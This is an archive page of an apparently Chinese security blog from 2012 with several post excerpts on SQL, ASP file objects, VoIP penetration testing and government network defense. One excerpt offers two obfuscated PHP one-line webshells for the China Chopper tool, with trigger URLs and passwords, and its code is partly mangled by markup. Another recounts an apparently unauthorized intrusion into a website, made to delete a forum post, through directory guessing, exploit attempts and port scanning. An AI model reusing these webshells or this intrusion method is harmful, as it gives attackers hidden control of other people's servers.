<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Archives: 2012 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="home-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      
<main class="content" role="main">
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2012-06-13T09:01:56.000Z" itemprop="datePublished">
          2012-06-13
      </time>
    
    
    | 
    <a href='/tag/Group-By一个不常用的用法/'>Group By一个不常用的用法</a>
    
    
</span>
      <h2 class="post-title"><a href="/514.seo/">Group By一个不常用的用法</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>乍一看，大家一定认为这有什么好写的呀，不就是group by 嘛，对指定列进行分组而已。我在这里说的是一个将被MS删除、不符合ISO语法的用法（大家可以在MS没有删除前显摆显摆嘛，至少2008没有删除）。好，那这是什么语法呢，那就是Group by ALL 。那它和不加ALL有什么差别呢？ 差别就是加了ALL后包含所有组和结果集，甚至包含那些其中任何行都不满足 WHERE 子句指定的搜索条件的组和结果集。注意的是指定了 ALL，将对组中不满足搜索条件的汇总列返回空值。 </p>
      
      </p>
      
      <p>
          <a href="/514.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2012-06-13T08:54:05.000Z" itemprop="datePublished">
          2012-06-13
      </time>
    
    
    | 
    <a href='/tag/ASP/'>ASP</a>,
    
    <a href='/tag/FSO/'>FSO</a>,
    
    <a href='/tag/ASP中FSO的神奇功能/'>ASP中FSO的神奇功能</a>
    
    
</span>
      <h2 class="post-title"><a href="/512.seo/">ASP中FSO的神奇功能</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>在ASP中，FSO的意思是File System Object，即文件系统对象。 </p>  <p> 我们将要操纵的计算机文件系统，在这里是指位于web服务器之上。所以，确认你对此拥有合适的权限。理想情况下，你可以在自己的机器上建立一个web服务器，这样就能方便地进行测试。如果运行于Windows平台，请试一试微软公司的免费个人Web服务器PWS。 </p>  <p> FSO 模型对象 </p>  <p> Drive Object：驱动器对象 供存取磁盘或者网络驱动器    <br /> FileSystemObject Object：文件系统对象 供存取计算机的文件系统     <br /> Folder Object：文件夹对象 供存取文件夹的所有属性     <br /> TextStream Object：文本流对象 供存取文件内容 </p>  <p> 你可以使用上面的对象做计算机上的任何事情，也包括破坏活动 ;-( 所以，请小心使用FSO。在web环境中，存储信息是非常重要的，比如用户信息，日志文件，等等。FSO提供了一个强大且简单的方法高效率地保存数据。在这篇文章里面，着重讨论FileSystemObject和TextStream对象。 </p>  <p> FSO由微软公司提供支持，对于非Windows系统，大概不能再使用ASP。 </p>  <p> 怎么样使用FSO？ </p>  <p> 为了使用FSO来执行所有的工作，首先要创建对象，代码就象下面这样： </p>  <p>＜ % Set fso = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;) % ＞ </p>
      
      </p>
      
      <p>
          <a href="/512.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2012-06-12T10:59:46.000Z" itemprop="datePublished">
          2012-06-12
      </time>
    
    
    | 
    <a href='/tag/一句话/'>一句话</a>
    
    
</span>
      <h2 class="post-title"><a href="/510.seo/">两个变形的一句话php马</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>在t00ls里论坛看到的，原来在<a href="http://www.t00ls.net/thread-18388-4-1.html。不过他们的楼上的方法都不好，我回复了一下，就是这样：">http://www.t00ls.net/thread-18388-4-1.html。不过他们的楼上的方法都不好，我回复了一下，就是这样：</a> </p>  <p>不过何必像楼上的生成文件再用哪么麻烦呢？   <br />第一种：1.php    <br />&lt; ?php ($_=@$<em>GET[2]).@$</em>($<em>POST[1])?&gt;    <br />我变了一下，在菜刀里写<a href="http://127.0.0.1:88/1.php?2=assert密码是1">http://127.0.0.1:88/1.php?2=assert密码是1</a>    <br />第二种2.php    <br />&lt; ?php    <br />$</em>=&quot;&quot;;    <br />$<em>[+&quot;&quot;]=’’;    <br />$</em>=&quot;$<em>&quot;.&quot;&quot;;    <br />$</em>=($<em>[+&quot;&quot;]|&quot;&quot;).($</em>[+&quot;&quot;]|&quot;&quot;).($<em>[+&quot;&quot;]^&quot;&quot;);    <br />?&gt;    <br />&lt; ?php ${‘</em>‘.$<em>}[‘</em>‘](${‘<em>‘.$</em>}[‘<strong>‘]);?&gt; </p>  <p>在菜刀里写   <br />&lt;a href=”<a href="http://127.0.0.1:88/3.php?_=assert&amp;amp">http://127.0.0.1:88/3.php?_=assert&amp;amp</a>;</strong>=eval(“&gt;<a href="http://127.0.0.1:88/3.php?_=assert&amp;__=eval(">http://127.0.0.1:88/3.php?_=assert&amp;__=eval(</a></a>$_POST[‘pass’]) 密码是pass </p>  <p>这两种就可以直接用菜刀了。   <br />不过我是直接写在url里，如果你用菜刀的附加数据的话更隐蔽，因为是post提交的。</p>
      
      </p>
      
      <p>
          <a href="/510.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2012-06-12T10:28:08.000Z" itemprop="datePublished">
          2012-06-12
      </time>
    
    
    | 
    <a href='/tag/渗透测试/'>渗透测试</a>,
    
    <a href='/tag/渗透/'>渗透</a>,
    
    <a href='/tag/backtrack/'>backtrack</a>,
    
    <a href='/tag/VoIP渗透测试/'>VoIP渗透测试</a>
    
    
</span>
      <h2 class="post-title"><a href="/507.seo/">VoIP渗透测试</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>VoIP or voice over IP (Internet protocol) is a transmission mode designed for use in voice and multimedia communications. As IP (Internet protocol)-based networks like the Internet seem to be most successful communications infrastructure, the traditional telephone network is currently being replaced VoIP. Nowadays, its clear improvements and advantages over the old systems make it a popular substitute, with a number of advantages. Among them:</p>  <p>The low cost of VoIP as compared to a traditional telephone network. There are any number of services available free of cost (like Skype) that allow you to communicate over distances long or short, PC-to-PC and free of cost.</p>  <p>VoIP is portable. Portability and mobility is another advantage of VoIP over traditional telephone; you only need an Internet connection for communication.</p>  <p>VoIP service includes a number of different advanced features not normally available with traditional telephone service, including call forwarding, conference call, caller ID, virtual numbers and more.</p>  <p>The advantages are many but this is not our main topic of discussion. (Likewise, there are a number of disadvantages, too: VoIP services depend on Internet connection speed; voice quality depends on the performance of your computer, and so forth). So what is our point in discussing this? What we examine here will be the security aspect of VoIP. In this article, we will review:</p>  <p>An overview of VoIP </p>  <p>What is Asterisk? (and what are the functionalities) </p>  <p>What is Trixbox? </p>  <p>VoIP hacking (Penetration testing on an asterisk based network)</p>  <p>With so many aforementioned advantages, VoIP is gaining popularity among both organizations and private users alike. But what about the security issues? As should be entirely predictable, any new technology immediately presents opportunities for those seeking to cause mischief. This is confirmed by reports I’m sure you’ve heard about: not just the phone hacking scandal in Britain, but the hacking in which thieves easily steal confidential information from a victim because their network was not secure.</p>  <p>If you are a pen tester or ethical hacker, then you have an idea about the importance of penetration testing in VoIP, because most of the important communications going on today occur on VoIP and securing confidential information is therefore critical. We will do some practical penetration testing on a VoIP-based network, but first of all I will show you how to build it.</p>  <p>Asterisk is an open-source software that can turn your computer into a communications server. There’s an asterisk software for PBX (private branch exchange) that allows you to make calls and transfer your data.</p>  <p>Trixbox is a wonderful software (or PBX: private branch exchange), based on the asterisk project. It was formally known as but in October 2006 it was renamed Trixbox. The difference between trixbox with other PBX is that trixbox is based on IP (Internet protocol) and has been designed for small and medium sized businesses. There are mainly two version of trixbox available: one is Trixbox CE (a free and open source), while the other – called Trixbox Pro – is one that you will need to purchase.</p>  <p>Protocols &amp; Ports</p>  <p>You must have an idea about the protocols and their ports before attempting to launch actual penetration testing on a VoIP network.</p>  <p>SIP (or session initiation protocol) has been defined by Internet Engineering Task Force (IETF) as the protocol for VoIP communication (in other words: a signaling protocol). SIP uses port 5060 and 5061 for both TCP and UDP.</p>  <p>SDP or session description protocol is for multimedia communications, while MGCP (media gateway control protocol) uses port number 2427 and 2727 for UDP.</p>  <p>RTP (real-time transfer protocol) defines the packets to deliver videos and audios on IP based network like VoIP. RTCP (RTP control protocol) is just like RTP, and it is used to structure the packets that are defined by RTP.</p>  <p>IAX (Inter-Asterisk eXchange) is an important protocol used in the asterisk system and is supported by a different soft-phone and PBX. IAX2 is the second version of IAX and works on the UDP port number 4569.</p>  <p>VoIP Penetration Testing</p>  <p>The process of penetration testing on a VoIP network is generally the same as the penetration testing on any other network. All we need to do is to follow the general guidelines, starting with information gathering, as we would with any form of penetration testing. We will do the same on VoIP network.</p>
      
      </p>
      
      <p>
          <a href="/507.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2012-06-12T10:18:44.000Z" itemprop="datePublished">
          2012-06-12
      </time>
    
</span>
      <h2 class="post-title"><a href="/504.seo/">2个星期艰难的渗透纪实</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p><b>2</b><b>个星期艰难的渗透纪实</b></p>  <p>作者：kyo327<b></b></p>  <p>入侵原因，需删一帖子，目标用www.111.com代替，前期通过初期的网站文件暴力猜解，扫描到robots.txt这个文件，有以下目录。如图1：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/2_201D/clip_image001.jpg" width="254" height="284" /></p>  <p>图1</p>  <p>再通过对这些文件的访问，从3gadm.php文件的标题栏得到该网站采用的是diy-page8.3的cms，自然可以先用搜索引擎搜索该cms暴露的已知漏洞入手。我搜到的大概有三个版本别人分析的结果：一个是子仪的盲注exp，还有两个是来自t00ls的。由于该网站服务器安装有WEB防火墙，导致同一个IP不能多次连续的提交get或post请求，否则就被认为是非法的。这样一来盲注那个exp也就一直没有成功，而我测试使用t00ls小蟑螂那个exp时，在本机自己搭建环境的最新版本是成功的，但是目标仍然失败，我考虑也许是目标版本较低的原因。</p>  <p>由于后台文件admin.php被改名，同时也在进行着网站后台文件的暴力猜解中。不过也许我的字典文件不够大也不够好，结果很令人失望。并且该网站做了禁止普通用户注册、禁止普通用户登陆的安全措施，这样连传图片的权利也给封杀了。</p>  <p>再看他的论坛，毕竟要删的帖子是在论坛上的，但他使用的是最新版的</p>  <p>discuz! X2，因为我测试了之前那个漏洞不好使。</p>  <p>到这里该目标的网站程序方面大概有了些了解，但有用的信息不是很多。接着我用nmap扫描了web服务器的端口情况，只开了80，也许其他端口被防火墙K掉了吧。通过经验访问一个不存在目录，服务器返回如图2：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/2_201D/clip_image002.jpg" width="540" height="144" /></p>  <p>图2</p>  <p>从图2看出，貌似是iis7.0或iis7.5，再用iiswrite.exe对网站发送一个head包，返回 Server: Microsoft-IIS/7.5，这样的话大概能确定该网站服务器操作系统应该是windows2008.</p>  <p>通过上面的分析，没有找到什么突破口，接下来大家都能想到，可以扫描一下他web服务器上都有哪些网站，从该服务器上的其他网站入手是大家一贯的手法，我也就不多说了。只是我是个苦命人啊，再次遇到cdn，无法简单的判断网站的真实IP。</p>  <p>关于cdn我在这里用简单的几句话科普一下，用户在自己的<a href="http://baike.baidu.com/view/7718.htm">浏览器</a>中输入要访问的网站的域名，网站主dns选择比较近的cdn服务商节点，并把请求的内容缓存到cdn节点服务器，再把cdn节点服务器ip返回给用户，最后用户再向给定的cdn接点请求网站内容。</p>
      
      </p>
      
      <p>
          <a href="/504.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2012-06-12T10:12:48.000Z" itemprop="datePublished">
          2012-06-12
      </time>
    
    
    | 
    <a href='/tag/大黑阔/'>大黑阔</a>,
    
    <a href='/tag/小黑客/'>小黑客</a>
    
    
</span>
      <h2 class="post-title"><a href="/502.seo/">政府的数十万设备为什么连小黑客都挡不住</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>嘟嘟的手机铃声，惊扰了我午夜的酣睡，迷迷糊糊中隐约的听到电话中急切的声音：“我们政府网站遭受黑客攻击了”，听到这里我顿时睡意全无，细心的聆听电话那头的情况陈述……。   <br />掌握大致情况后，迅速爬上网络打开受攻击的站点，原来的页面已经被改得面目全非了。在网页的首屏上是一个来回走动的大螃蟹，下面附着一条标语：“老子横行江湖数年，偶而路过，只因最近十分烦躁，特拿此站练手”。 </p>  <p>解决受攻击站点实例 </p>  <p>这种情况只有去查服务器记录，半个小时后，我到了该政府的服务器机房。做的第一件事就是把服务器访问日志下载到自己的笔记本上，(因为习惯，对谁的机器都不放心，只相信自己的)，经过仔细分析日志，发现有人在主站的上传了一个私人论坛。根据经验判断，这个论坛程序是罪魁祸首。于是经过调查，发现论坛是负责维护该站的小李私自放上去的，这个论坛是免费的动网论坛，小李只是做了简单的修改，便把程序上传到服务器。在业内很多人都知道动网=洞网，从日志的分析来看，入侵者就是利用某安全组织刚刚公布的动网上传漏洞，获得了主服务器的控制权。随后删除了论坛程序，还原备份页面，至此恢复了网站的原貌。从踏入机房到恢复站点，只有5分种。   <br />企业网络信息安全面临不解的困惑    <br />此事件引起了政府相关部门领导的高度重视，第二天，他们领导奇怪的问我：我们每年都花几十万的政府采购，更是把网络安全放在了第一位，我们配备的有防火墙，IPS，IDS，为什么这么坚固的城墙就不管用呢，早知道如此，就不去买这些设备了。这个问题也许是很多企业都面临的困惑。 </p>  <p>解惑一：缺乏技术培训，好刀使不到刃上 </p>  <p>其实防火墙、IDS、IPS等硬件防护设备针对某些入侵手段有着很好的效果，只是企业部署后，没有发挥真正的作用。如上面的实例中，我曾检查过防火墙的配置，发现好多设置都是默认状态，竟然连登陆用户名和密码都是出厂默认值。这可以说明网络管理人员缺乏相应技能培训，才会造成很多设备无用武之地的尴尬局面，就好象厨子用青龙偃月刀切菜一样，同样一把刀，放在厨子手里只能切菜，而放在关羽手里则能过五关斩六将。所以，有了好设备不等于有了安全，需要把设备进行合理的配置才能发挥它们应有的性能。很多企业显然把这些技术工作交给了集成商和厂家来完成。从资金投入角度考虑，这样的做法非常适合中小企业。但政府的中心机构和大型企业不缺的就是资金，想要实现网络信息安全，这些大型企业就一定要有自己的运行维护力量，只有自己的东西自己管才能真正的确保第一道安全 防线。 </p>  <p>解惑二：没有安全意识，安全将无从谈起 </p>  <p>从上面的实例中，我们不难看出，企业员工的安全意识决定了企业网络安全的健壮性。这一点对网络管理人员来说，尤其重要。作为单位的网络管理者如果小李懂得起码的安全常识，就不会把免费的论坛放到服务器上；如果小李了解安全的重要性，也不会去下载这样的程序，起码不会在企业网络内下载。这些都是员工缺乏安全意识的表现。   <br />再举个实例：某集团也曾打来求助电话，他们的企业网络频繁的掉线，几乎处于瘫痪状态。我在检查了设备信息和配置后，发现一台华为交换机，全部都是死包，凭借经验初步判断应该是遭到了蠕虫攻击，但这还需要事实来证明。捕获数据包后，经过分析，确定就是蠕虫病毒惹的祸。而查找毒源却遇到了麻烦，根据数据包的分析，很快能判断出毒源机器的IP与MAC地址，但问管理人员这是哪台机器时，他们没有一个人知道的。这就只能从交换机处下手，但让我郁闷的事情又来了，由于机房管理混乱，防静电地板上的烟头随处可见，很多交换机上都没有网线标签，布线也极乱无比，为了排查这台机器，我们3个人用笔一个一个记录，花了整整2个小时才把问题机 找到。在这个问题机上发现了大量的病毒，还有很多成人片。    <br />无论政府还是企业都应该有相应的安全管理制度和规范，这些是指导员工行为的重要准则。如 果该政府相关部门规定不允许下载任何程序，或是只限网络管理人员下载，那政府站点的小李下载带有安全隐患程序的情况就不会出现；如果规范机房的管理和使用，那我也不会在集团公司浪费2个小时整理线缆，如果规范的操作流程守则，如果有规范的网络安全制度，如果……，有这些如果也会黑客入侵攻击增加相当大的 难度。这也印证了不知道谁说的那句古话：安全是三分技术，七分管理。 </p>  <p>解惑三：如何规范配置网络安全设备，制定合理的安全策略 </p>  <p>1、要规范防火墙的安全策略，如增加防火墙的规则匹配，有些防火墙属于嵌入式开发的设备，这就需要熟练使用linux命令和dos 命令，还有一些防火墙需要按自身情况具体配置，如Cisco的PIX防火墙，H3C的SecPath防火墙等。   <br />2、然后最好能在网络中计划分出vlan和绝对独立的安全域，即使有病毒蔓延，也不至于感染整个网络。    <br />3、对于工作站，要启用组策略，并且在系统里面把自动播放给完全禁用，根据目前流行的蠕虫攻击和移动存储设备感染来看，多数都是自动访问存储设备的时造成了间接感染。删除guest帐号，定期更改密码等基本安全维护策略。最好能绑定工作站的mac地址和ip地址，具体落实到一机一人，达到规范使用计算机的目的。    <br />4、把个人移动存储设备与企业办公用存储设备分开使用。人手一个，专人专用，定期杀毒。    <br />其实从国内信息安全的整体情况看，企业和政府依然存在很大的安全隐患，就是买了再好的网络安全设备，没有人调试和配置，那也是形同虚设，网络管理不规范，员工的安全意识不够高，都可能造成严重的恶果。 </p>
      
      </p>
      
      <p>
          <a href="/502.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <nav class="pagination" role="pagination">
    <a class="newer-posts" href="/archives/2012/page/16/">← Newer Posts</a>
    <span class="page-number">Page 17 of 29</span>
    <a class="older-posts" href="/archives/2012/page/18/">Older Posts →</a>
  </nav>
</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
